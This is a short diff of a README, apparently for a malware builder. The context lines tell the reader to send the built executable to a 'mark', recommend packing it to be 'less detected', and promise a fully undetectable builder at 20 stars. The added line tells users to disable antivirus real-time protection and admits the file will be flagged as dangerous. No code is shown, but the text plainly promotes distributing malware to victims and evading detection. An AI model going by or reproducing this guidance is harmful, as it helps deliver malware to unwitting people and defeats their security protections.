@@ -30,5 +30,6 @@ Rename the exe in the dist folder, and send it to your mark! Enjoy!
 
 virtualenv and UPX are recommended to make it smaller, faster, and less detected <br>
 
+NOTE: You will need to turn off your antivirus, or atleast Rtp (realtime protection). If the release build does not work, you may need to use the source build which still has the same features just not as polished. the fill will most definetly be marked as dangerous however. 
 Enjoy :)
 20 🌟 = FUD Builder
